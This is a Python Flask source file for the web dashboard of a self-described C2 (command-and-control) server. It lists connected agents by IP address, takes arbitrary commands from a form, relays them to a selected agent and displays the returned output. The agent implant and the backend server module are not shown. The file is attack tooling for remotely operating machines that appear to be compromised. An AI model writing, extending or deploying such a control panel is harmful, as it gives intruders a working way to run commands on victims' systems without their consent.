import threading
import time
from flask import Flask, render_template, request
import server


app = Flask(__name__)



@app.route('/', )
def home():
    print("Current IPS:", server.IPS)
    return render_template('index.html', threads=server.THREADS, ips=server.IPS)


@app.route("/<string:agentname>/executecmd")
def executecmd(agentname):
    return render_template('execute.html', name=agentname)

@app.route("/<string:agentname>/execute", methods=['POST'])
def execute(agentname):
    if request.method == 'POST':
        cmd = request.form['command']
    
        req_index = None
        for i in range(len(server.IPS)):
            if server.IPS[i] and agentname == f"Agent {i+1}":
                req_index = i
                break
        
        if req_index is not None:
            print(f"[*] Sending command to Agent {req_index+1}: {cmd}")
            server.CMD_INPUT[req_index] = cmd  # Send command to agent
            time.sleep(2)  # Wait for response
            cmdoutput = server.CMD_OUTPUT[req_index]  # Retrieve output
            server.CMD_OUTPUT[req_index] = ''  # Reset output after displaying it
        else:
            cmdoutput = "Agent not found."

        return render_template('execute.html', cmdoutput=cmdoutput, name=agentname)

if __name__ == "__main__":
   # Initialize server
    print("[+] Starting C2 server...")
    threading.Thread(target=server.start_server, daemon=True).start()
    print("[+] C2 server started.")
    app.run(debug=True)